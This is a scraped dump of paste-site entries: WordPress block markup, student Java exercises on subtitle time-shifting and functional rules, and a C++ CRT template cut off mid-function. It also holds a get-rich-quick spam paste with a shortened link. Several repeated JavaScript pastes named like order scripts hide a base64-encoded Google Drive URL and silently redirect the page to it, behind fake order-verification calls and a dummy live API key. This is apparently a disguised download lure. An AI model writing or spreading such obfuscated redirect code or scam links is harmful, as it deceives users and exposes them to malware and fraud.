<!-- wp:greenshift-blocks/text {""id"":""gsbp-e52ac38"",""inlineCssStyles"":"".gspb_text-id-gsbp-e52ac38{color:#1B88ED;}.gspb-hoverparent-212:hover .gspb_text-id-gsbp-e52ac38{color:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd);}.gspb_text-id-gsbp-e52ac38{margin-bottom:0px!important;}"",""textContent"":""Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commo"",""spacing"":{""margin"":{""values"":{""bottom"":[""0px""]},""locked"":false},""padding"":{""values"":[],""locked"":false}},""typography"":{""textShadow"":[],""colorHover"":""var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd)"",""relativeHover"":true,""hoverClass"":""gspb-hoverparent-212"",""color"":""#1B88ED""},""metadata"":{""name"":""Subtitle""}} -->
<div id=""gspb_text-id-gsbp-e52ac38"" class=""gspb_text gspb_text-id-gsbp-e52ac38 "">Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commo</div>
<!-- /wp:greenshift-blocks/text --></div>
<!-- /wp:greenshift-blocks/container -->

<!-- wp:greenshift-blocks/container {""id"":""gsbp-01abd79"",""inlineCssStyles"":"".gspb_container-id-gsbp-01abd79{flex-direction: column;box-sizing: border-box;}#gspb_container-id-gsbp-01abd79.gspb_container \u003e p:last-of-type{margin-bottom:0}#gspb_container-id-gsbp-01abd79.gspb_container{position:relative;}#gspb_container-id-gsbp-01abd79.gspb_container{display:flex;flex-direction:column;row-gap:24px;}#gspb_container-id-gsbp-01abd79.gspb_container{padding-top:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);padding-right:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);padding-bottom:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);padding-left:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);}#gspb_container-id-gsbp-01abd79.gspb_container{border-top-left-radius:12px;border-top-right-radius:12px;border-bottom-right-radius:12px;border-bottom-left-radius:12px;}#gspb_container-id-gsbp-01abd79.gspb_container \u003e .gspb_backgroundOverlay{border-top-left-radius:12px;border-top-right-radius:12px;border-bottom-right-radius:12px;border-bottom-left-radius:12px;}#gspb_container-id-gsbp-01abd79.gspb_container:hover{background-image:linear-gradient(180deg,rgb(27,136,237) 0%,rgb(12,86,156) 100%);}#gspb_container-id-gsbp-01abd79.gspb_container{width:300px;}"",""alignSelf"":[null],""flexbox"":{""enable"":false,""flexDirection"":[""column""],""type"":""flexbox"",""gridcolumns"":[1],""rowgap"":[""24px""]},""background"":{""backgroundHoverState"":""Gradient"",""gradientHover"":""linear-gradient(180deg,rgb(27,136,237) 0%,rgb(12,86,156) 100%)""},""border"":{""borderRadius"":{""values"":{""topLeft"":[""12px""],""topRight"":[""12px""],""bottomRight"":[""12px""],""bottomLeft"":[""12px""]},""locked"":true},""style"":[],""size"":[],""color"":[],""styleHover"":[],""sizeHover"":[],""colorHover"":[],""custom"":[],""customEnabled"":[]},""spacing"":{""margin"":{""values"":[],""locked"":false,""usePreset"":true,""presetValueB"":[0]},""padding"":{""values"":[],""locked"":false,""usePreset"":true,""presetValueT"":[3],""presetValueR"":[3],""presetValueB"":[3],""presetValueL"":[3]}},""blockWidth"":{""customWidth"":{""value"":[""300px""]},""customHeight"":{""value"":[]},""widthType"":""custom""},""className"":""gspb-hoverparent-212""} -->
<div class=""wp-block-greenshift-blocks-container gspb_container gspb_container-gsbp-01abd79 gspb-hoverparent-212"" id=""gspb_container-id-gsbp-01abd79""><!-- wp:greenshift-blocks/iconbox {""id"":""gsbp-09b9523"",""inlineCssStyles"":""#gspb_iconBox-id-gsbp-09b9523 svg{width: 72px;}#gspb_iconBox-id-gsbp-09b9523{justify-content:center;display:flex;}#gspb_iconBox-id-gsbp-09b9523 svg, #gspb_iconBox-id-gsbp-09b9523 svg path{fill:#1B88ED !important;}#gspb_iconBox-id-gsbp-09b9523 svg{margin:0px !important;}.gspb-hoverparent-212:hover #gspb_iconBox-id-gsbp-09b9523 svg, .gspb-hoverparent-212:hover #gspb_iconBox-id-gsbp-09b9523 svg path{fill:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd) !important;}#gspb_iconBox-id-gsbp-09b9523 .gspb_iconBox__wrapper{margin-bottom:0px;}"",""spacing"":{""margin"":{""values"":{""bottom"":[""0px""]},""locked"":false},""padding"":{""values"":{},""locked"":false}},""iconBox_icon"":{""icon"":{""font"":""rhicon rhi-paper-plane"",""svg"":""\u003csvg xmlns=\u0022http://www.w3.org/2000/svg\u0022 width=\u0022200\u0022 height=\u0022200\u0022 viewBox=\u00220 0 256 256\u0022\u003e\u003cpath fill=\u0022currentColor\u0022 d=\u0022m114.34 154.34l96-96a8 8 0 0 1 11.32 11.32l-96 96a8 8 0 0 1-11.32-11.32M128 88a63.9 63.9 0 0 1 20.44 3.33a8 8 0 1 0 5.11-15.16a80 80 0 0 0-105.06 84.71a8 8 0 0 0 7.94 7.12c.29 0 .59 0 .89-.05a8 8 0 0 0 7.07-8.83A64.92 64.92 0 0 1 64 152a64.07 64.07 0 0 1 64-64m99.74 13a8 8 0 0 0-14.24 7.3a96.27 96.27 0 0 1 5 75.71l-181.1-.07A96.24 96.24 0 0 1 128 56h.88a95 95 0 0 1 42.82 10.5a8 8 0 1 0 7.3-14.23a112 112 0 0 0-156.66 137A16.07 16.07 0 0 0 37.46 200h181.07a16 16 0 0 0 15.11-10.71a112.35 112.35 0 0 0-5.9-88.3Z\u0022/\u003e\u003c/svg\u003e"",""image"":""""},""fill"":""#1B88ED"",""fillhover"":""var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd)"",""type"":""svg"",""relativeHover"":true,""hoverClass"":""gspb-hoverparent-212""}} -->
<div class=""wp-block-greenshift-blocks-iconbox gspb_iconBox gspb_iconBox-id-gsbp-09b9523"" id=""gspb_iconBox-id-gsbp-09b9523""><div class=""gspb_iconBox__wrapper"" style=""display:inline-flex""><svg xmlns=""http://www.w3.org/2000/svg"" style=""width:5rem;height:5rem;margin:10px"" width=""200"" height=""200"" viewBox=""0 0 256 256""><path fill=""currentColor"" d=""m114.34 154.34l96-96a8 8 0 0 1 11.32 11.32l-96 96a8 8 0 0 1-11.32-11.32M128 88a63.9 63.9 0 0 1 20.44 3.33a8 8 0 1 0 5.11-15.16a80 80 0 0 0-105.06 84.71a8 8 0 0 0 7.94 7.12c.29 0 .59 0 .89-.05a8 8 0 0 0 7.07-8.83A64.92 64.92 0 0 1 64 152a64.07 64.07 0 0 1 64-64m99.74 13a8 8 0 0 0-14.24 7.3a96.27 96.27 0 0 1 5 75.71l-181.1-.07A96.24 96.24 0 0 1 128 56h.88a95 95 0 0 1 42.82 10.5a8 8 0 1 0 7.3-14.23a112 112 0 0 0-156.66 137A16.07 16.07 0 0 0 37.46 200h181.07a16 16 0 0 0 15.11-10.71a112.35 112.35 0 0 0-5.9-88.3Z""></path></svg></div></div>
<!-- /wp:greenshift-blocks/iconbox -->

<!-- wp:greenshift-blocks/text {""id"":""gsbp-45c2b96"",""inlineCssStyles"":"".gspb_text-id-gsbp-45c2b96{font-size:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dfont-size\u002d\u002dlarge) !important;}.gspb_text-id-gsbp-45c2b96{color:#1B88ED;}.gspb-hoverparent-212:hover .gspb_text-id-gsbp-45c2b96{color:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd);}"",""textContent"":""Lorem Ipsum"",""typography"":{""textShadow"":[],""themeFontsizePresetEnable"":true,""themeFontsizePreset"":""large"",""colorHover"":""var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd)"",""relativeHover"":true,""hoverClass"":""gspb-hoverparent-212"",""color"":""#1B88ED""},""metadata"":{""name"":""Title""}} -->
<div id=""gspb_text-id-gsbp-45c2b96"" class=""gspb_text gspb_text-id-gsbp-45c2b96 "">Lorem Ipsum</div>
<!-- /wp:greenshift-blocks/text -->

<!-- wp:greenshift-blocks/text {""id"":""gsbp-6d741cf"",""inlineCssStyles"":"".gspb_text-id-gsbp-6d741cf{color:#1B88ED;}.gspb-hoverparent-212:hover .gspb_text-id-gsbp-6d741cf{color:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd);}.gspb_text-id-gsbp-6d741cf{margin-bottom:0px!important;}"",""textContent"":""Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commo"",""spacing"":{""margin"":{""values"":{""bottom"":[""0px""]},""locked"":false},""padding"":{""values"":[],""locked"":false}},""typography"":{""textShadow"":[],""colorHover"":""var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd)"",""relativeHover"":true,""hoverClass"":""gspb-hoverparent-212"",""color"":""#1B88ED""},""metadata"":{""name"":""Subtitle""}} -->
<div id=""gspb_text-id-gsbp-6d741cf"" class=""gspb_text gspb_text-id-gsbp-6d741cf "">Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commo</div>
<!-- /wp:greenshift-blocks/text --></div>
<!-- /wp:greenshift-blocks/container --></div>
<!-- /wp:greenshift-blocks/row-column --> </div></section>
<!-- /wp:greenshift-blocks/row -->"
y5FnFvE1,[NP] Subtitles,dzocesrce,Java,Friday 18th of April 2025 12:32:40 PM CDT,"import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.time.LocalTime;

import java.util.Scanner;
class Element {
    private int id;
    private String time;
    private String reply;

    public Element(int id, String time, String reply) {
        this.id = id;
        this.time = time;
        this.reply = reply;
    }

    public String getTime() {
        return time;
    }

    public void setTime(String time) {
        this.time = time;
    }

public long getNanoSeconds(String time) {
    String[] parts = time.split("","");
    LocalTime localTime = LocalTime.parse(parts[0]); // ""HH:mm:ss""
    long baseNanos = localTime.toNanoOfDay(); // total nanos up to this time
    long extraNanos = Long.parseLong(parts[1]); // extra nanos from input
    return baseNanos + extraNanos;
}

public void changeTime(int shift) {
    String[] times = time.replace("" --> "", "" "").split(""\\s+"");

    long nanoStart = getNanoSeconds(times[0]) + shift;
    long nanoEnd = getNanoSeconds(times[1]) + shift;

    String formattedStart = formatWithLast3Nanos(nanoStart,shift);
    String formattedEnd = formatWithLast3Nanos(nanoEnd,shift);

    setTime(formattedStart + "" --> "" + formattedEnd);
}

private String formatWithLast3Nanos(long nanos, int shift) {
    LocalTime time = LocalTime.ofNanoOfDay(nanos);
    int nano = time.getNano(); // full nanos
    int last3 = nano % 1000;   // last 3 digits
    if(shift>0 && last3-shift<0)
        return String.format(""%02d:%02d:%02d,%03d"", 
        time.getHour(), time.getMinute(), time.getSecond()+1, last3);
    else if(shift<0 && last3+shift>1000)
        return String.format(""%02d:%02d:%02d,%03d"", 
        time.getHour(), time.getMinute(), time.getSecond()-1, last3);
    else
        return String.format(""%02d:%02d:%02d,%03d"", 
        time.getHour(), time.getMinute(), time.getSecond(), last3);
}

    @Override
    public String toString() {
        return String.format(""%d\n%s\n%s\n"",id,time,reply);
    }
}

public class SubtitlesTest {
    public static void main(String[] args) {
        Subtitles subtitles = new Subtitles();
        int n = subtitles.loadSubtitles(System.in);
        System.out.println(""+++++ ORIGINIAL SUBTITLES +++++"");
        subtitles.print();
        int shift = n * 37;
        shift = (shift % 2 == 1) ? -shift : shift;
        System.out.println(String.format(""SHIFT FOR %d ms"", shift));
        subtitles.shift(shift);
        System.out.println(""+++++ SHIFTED SUBTITLES +++++"");
        subtitles.print();
    }
}

 class Subtitles {
    private List<Element> elements;

    public Subtitles() {
        this.elements = new ArrayList<>();
    }

    public int loadSubtitles(InputStream in) {
        Scanner scanner = new Scanner(in);

        while (scanner.hasNextLine()) {
            String line = scanner.nextLine().trim();
            if (line.isEmpty()) continue;
            int id = Integer.parseInt(line);
            String time = scanner.nextLine().trim();
            String text = scanner.nextLine().trim();
            while (scanner.hasNextLine()) {
                String nextLine = scanner.nextLine().trim();
                if (nextLine.isEmpty()) break;
                text += ""\n"" + nextLine;
            }
            elements.add(new Element(id, time, text));
        }
        return elements.size();
    }

    public void print() {
        StringBuilder sb= new StringBuilder();
        for(Element e : elements){
            sb.append(e.toString());
            if(e.equals(elements.get(elements.size()-1)))
                break;
            sb.append(""\n"");
        }

        System.out.println(sb.toString());
    }

    public void shift(int shift) {
  for(Element e: elements)
        e.changeTime(shift);
    }
}"
utdUCabQ,EARN $900 INSTANTLY 2025⭐ 8F,bart22,JavaScript,Friday 18th of April 2025 12:25:33 PM CDT," 
Pdf https://tinyurl.com/privguidee


xECg8fVZpt
"
JcJNQFjv,Market.js,dentira,JavaScript,Friday 18th of April 2025 12:20:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95846/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9PBcudTM,Untitled,dentira,JavaScript,Friday 18th of April 2025 12:05:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96233/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6rsrCxG5,[NP] Equation,dzocesrce,Java,Friday 18th of April 2025 12:01:05 PM CDT,"import java.util.*;
import java.util.Optional;
import java.util.function.Function;
import java.util.function.Supplier;
import java.util.Optional;
import java.util.function.Function;
import java.util.function.Predicate;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class EquationTester {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        int testCase = Integer.parseInt(sc.nextLine());

        if (testCase == 1) { // Testing with Integer, Integer
            List<Equation<Integer, Integer>> equations1 = new ArrayList<>();
            List<Integer> inputs = new ArrayList<>();
            while (sc.hasNext()) {
                inputs.add(Integer.parseInt(sc.nextLine()));
            }

            // TODO: Add an equation where you get the 3rd integer from the inputs list, and the result is the sum of that number and the number 1000.
            equations1.add(new Equation<>(
                    () -> inputs.get(2),
                    integer -> integer+1000
            ));

            // TODO: Add an equation where you get the 4th integer from the inputs list, and the result is the maximum of that number and the number 100.

            equations1.add(new Equation<>(
                    () -> inputs.get(3),
                    integer -> Math.max(integer,100)
            ));
            EquationProcessor.process(inputs, equations1);

        } else { // Testing with Line, Integer
            List<Equation<Line, Double>> equations2 = new ArrayList<>();
            List<Line> inputs = new ArrayList<>();
            while (sc.hasNext()) {
                inputs.add(Line.createLine(sc.nextLine()));
            }

            //TODO Add an equation where you get the 2nd line, and the result is the value of y in the line equation.
            equations2.add(new Equation<>(
                    () -> inputs.get(1),
                    i -> i.calculateLine()
            ));

            //TODO Add an equation where you get the 1st line, and the result is the sum of all y values for all lines that have a greater y value than that equation.
            equations2.add(new Equation<>(
                    () -> inputs.get(0),
                    i-> {
                        double Y = i.calculateLine();
                        return inputs.stream()
                                .mapToDouble(Line::calculateLine)
                                .filter(y->y>Y)
                                .sum();
                    }
            ));
            EquationProcessor.process(inputs, equations2);
        }
    }
}
class Rule<IN, OUT> {

    Predicate<IN> predicate;
    Function<IN,OUT> function;

    public Rule(Predicate<IN> predicate, Function<IN, OUT> function) {
        this.predicate = predicate;
        this.function = function;
    }

    public Optional<OUT> apply (IN input){
        if(predicate.test(input)){
            return Optional.of(function.apply(input));
        }
        return Optional.empty();
    }
}

class Line {
    Double coeficient;
    Double x;
    Double intercept;

    public Line(Double coeficient, Double x, Double intercept) {
        this.coeficient = coeficient;
        this.x = x;
        this.intercept = intercept;
    }

    public static Line createLine(String line) {
        String[] parts = line.split(""\\s+"");
        return new Line(
                Double.parseDouble(parts[0]),
                Double.parseDouble(parts[1]),
                Double.parseDouble(parts[2])
        );
    }

    public double calculateLine() {
        return coeficient * x + intercept;
    }

    @Override
    public String toString() {
        return String.format(""%.2f * %.2f + %.2f"", coeficient, x, intercept);
    }
}

class Equation<IN,OUT> {
    Supplier<IN> supplier;
    Function<IN,OUT> function;

    public Equation(Supplier<IN> supplier, Function<IN, OUT> function) {
        this.supplier = supplier;
        this.function = function;
    }

    public Optional<OUT> calculate(){
        return Optional.of(function.apply(supplier.get()));
    }
}
class EquationProcessor {
    public static <IN, OUT> void process(List<IN> inputs, List<Equation<IN, OUT>> equations) {
        List<List<OUT>> resultsPerEquation = new ArrayList<>();

        // Print all inputs
        for (IN input : inputs) {
            System.out.println(""Input: "" + input);
        }

        // Evaluate each equation once per input and store results
        for (Equation<IN, OUT> eq : equations) {
            List<OUT> results = new ArrayList<>();
            for (IN input : inputs) {
                Optional<OUT> result = eq.calculate();
                result.ifPresent(results::add);
            }
            resultsPerEquation.add(results);
        }

        // Check if each equation gives the same result for all inputs
        for (List<OUT> results : resultsPerEquation) {
            if (results.isEmpty()) continue;
            OUT first = results.get(0);
            boolean allEqual = results.stream().allMatch(r -> r.equals(first));
            if (allEqual) {
                System.out.println(""Result: "" + first);
            }
        }
    }
}"
UgBASBPa,Products.js,Epiphemeral,JavaScript,Friday 18th of April 2025 11:50:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89841/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kf52VYif,Order.js,Epiphemeral,JavaScript,Friday 18th of April 2025 11:34:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/59978/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
P98Wf5Zb,Market.js,Epiphemeral,JavaScript,Friday 18th of April 2025 11:18:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07909/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CFHCvxWn,Untitled,Epiphemeral,JavaScript,Friday 18th of April 2025 11:03:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62033/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H9Q2wfHG,[NP] Rule,dzocesrce,Java,Friday 18th of April 2025 10:56:38 AM CDT,"import java.util.List;
import java.util.Optional;
import java.util.Optional;
import java.util.function.Function;
import java.util.function.Predicate;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.Scanner;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

public class RuleTester {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        int testCase = Integer.parseInt(sc.nextLine());

        if (testCase == 1) { //Test for String,Integer
            List<Rule<String, Integer>> rules = new ArrayList<>();

            /*
            TODO: Add a rule where if the string contains the string ""NP"", the result would be index of the first occurrence of the string ""NP""
            * */
            rules.add(new Rule<>(
                    str -> str.contains(""NP""),
                    str -> str.indexOf(""NP"")
            ));

            /*
            TODO: Add a rule where if the string starts with the string ""NP"", the result would be length of the string
            * */
            rules.add(new Rule<>(
                    str -> str.startsWith(""NP""),
                    str -> str.length()
            ));



            List<String> inputs = new ArrayList<>();
            while (sc.hasNext()) {
                inputs.add(sc.nextLine());
            }

            RuleProcessor.process(inputs, rules);


        } else { //Test for Student, Double
            List<Rule<Student, Double>> rules = new ArrayList<>();

            //TODO Add a rule where if the student has at least 3 grades, the result would be the max grade of the student
            rules.add(new Rule<>(
                    student -> student.grades.size()>=3,
                    student -> student.grades.stream().mapToDouble(i->i).max().getAsDouble()
            ));

            //TODO Add a rule where if the student has an ID that starts with 20, the result would be the average grade of the student
            //If the student doesn't have any grades, the average is 5.0
            rules.add(new Rule<>(
                    student -> student.id.startsWith(""20""),
                    student -> student.grades.stream().mapToDouble(i->i).average().orElse(5.0)
            ));

            List<Student> students = new ArrayList<>();
            while (sc.hasNext()){
                students.add(Student.create(sc.nextLine()));
            }

            RuleProcessor.process(students, rules);
        }
    }
}



 class Rule<IN, OUT> {

    Predicate<IN> predicate;
    Function<IN,OUT> function;

    public Rule(Predicate<IN> predicate, Function<IN, OUT> function) {
        this.predicate = predicate;
        this.function = function;
    }

    public Optional<OUT> apply (IN input){
        if(predicate.test(input)){
            return Optional.of(function.apply(input));
        }
        return Optional.empty();
    }
}

class RuleProcessor {

    public static <IN, OUT> void process(List<IN> inputs, List<Rule<IN,OUT>> rules) {

        for(IN input : inputs) {
            System.out.println(""Input: ""+input.toString());
            for(Rule<IN,OUT> rule : rules) {
                Optional<OUT> result = rule.apply(input);
                if(result.isPresent()) {
                    System.out.println(""Result: ""+result.get().toString());
                }
                else{
                    System.out.println(""Condition not met"");
                }
            }
        }
    }
}


class Student {
    String id;
    List<Integer> grades;

    public Student(String id, List<Integer> grades) {
        this.id = id;
        this.grades = grades;
    }

    public static Student create(String line) {
        String[] parts = line.split(""\\s+"");
        String id = parts[0];
        List<Integer> grades = Arrays.stream(parts).skip(1).map(Integer::parseInt).collect(Collectors.toList());
        return new Student(id, grades);
    }

    @Override
    public String toString() {
        return ""Student{"" +
                ""id='"" + id + '\'' +
                "", grades="" + grades +
                '}';
    }
}"
8CbEJdqw,Products.js,Epiphemeral,JavaScript,Friday 18th of April 2025 10:48:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25044/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ebwH7Y3k,Order.js,Epiphemeral,JavaScript,Friday 18th of April 2025 10:32:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09283/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
f6UQTCd5,中国剩余定理 模板代码,Dmaxiya,C++,Friday 18th of April 2025 10:24:54 AM CDT,"class CRT {
private:
    static void swap(long long &a, long long &b) {
        a ^= b ^= a ^= b;
    }

public:
    static long long exgcd(long long a, long long b, long long &x, long long &y) {
        if (b == 0) {
            x = 1;
            y = 0;
            return a;
        }
        long long gcd = exgcd(b, a % b, x, y);
        long long t = x;
        x = y;
        y = t - (a / b) * y;
        return gcd;
